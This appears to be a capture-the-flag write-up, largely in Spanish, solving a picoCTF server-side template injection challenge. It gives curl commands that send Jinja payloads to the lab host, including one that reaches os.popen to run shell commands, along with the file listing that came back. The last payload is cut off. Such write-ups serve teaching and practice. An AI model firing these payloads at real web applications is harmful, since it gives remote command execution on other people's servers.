#### Descripción 
I made a cool website where you can announce whatever you want! Try it out!
I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:49783/)!
#### Solución
```bash
curl -X POST http://rescued-float.picoctf.net:49783/announce \
  -d "content={{7*7}}"
```
```bash
curl -X POST http://rescued-float.picoctf.net:49783/announce \
  -d "content={{request.application.__globals__.__builtins__.__import__('os').popen('ls .').read()}}"
```
```
__pycache__
app.py
flag
requirements.txt
```
```bash
curl -X POST http://rescued-float.picoctf.net:49783/announce \
  -d "content={{request.application.__globals__.__builtins__.__import__('os').pop
```
#### Notas
El título de la página (`SSTI1`) también era una pista directa.
Primero envié un POST a `/` y el servidor me redirigió con un `307` hacia `/announce`, así que ese era el endpoint real.
El servidor respondió con `49` en lugar de `{{7*7}}`, confirmando que el input se renderizaba directamente en el template sin sanitización.
Intenté leer `/flag` con RCE vía `os.popen`, pero la respuesta llegó vacía. Decidí explorar el sistema de archivos primero.
#### Referencias
